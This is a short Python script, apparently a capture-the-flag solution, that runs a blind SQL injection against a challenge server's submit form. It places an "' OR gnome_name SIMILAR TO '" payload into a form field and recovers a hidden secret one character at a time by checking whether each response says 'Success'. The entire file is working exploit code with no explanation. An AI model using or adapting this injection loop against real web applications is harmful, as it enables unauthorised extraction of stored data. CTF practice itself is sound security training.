import requests
import string

# Define the URL you want to send requests to
url = 'https://web7.chall.necst.it/submit'
sol = "0nB5SojadaDF9deZ"

for i in range(0, 3):
    for letter in (string.ascii_lowercase + string.ascii_uppercase + string.digits):
        tmp = sol + letter
        for j in range(0, 3-i-1):
            tmp += "_"
        assigned_name = 'Emanuel'
        gnome_name = "asdnfkksdkfh' OR gnome_name SIMILAR TO '" + tmp
        print(gnome_name)

        data = {
            'assigned_name': assigned_name,
            'gnome_name': gnome_name
        }

        # Send a POST request with the payload data
        response = requests.post(url, data=data)
        #print(response.text)

        # Check the response status
        if response.status_code == 200 and "Success" in response.text:
            sol += letter
            break

print(sol)
